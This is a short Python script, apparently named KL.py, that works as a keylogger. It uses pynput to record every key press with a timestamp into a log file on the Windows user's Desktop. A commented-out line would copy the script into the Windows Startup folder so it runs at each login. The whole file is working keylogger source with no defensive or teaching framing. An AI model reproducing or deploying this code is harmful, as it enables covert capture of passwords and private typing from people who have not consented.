from pynput.keyboard import Listener
import getpass
import os 
import logging

from shutil import copyfile

userprofile = os.environ['USERPROFILE']


print(userprofile)


logging_directory = f"{userprofile}/Desktop"

#copyfile('KL.py' , f'{userprofile}/AppData/Roaming/Microsoft/Windows/Start Menu/Programs/Startup/KL.py')



logging.basicConfig(filename=f"{logging_directory}/mylog.txt" , level=logging.DEBUG , format="%(asctime)s: %(message)s")

def key_handler(key):
    logging.info(key)

with Listener(on_press = key_handler) as listener:
    listener.join()
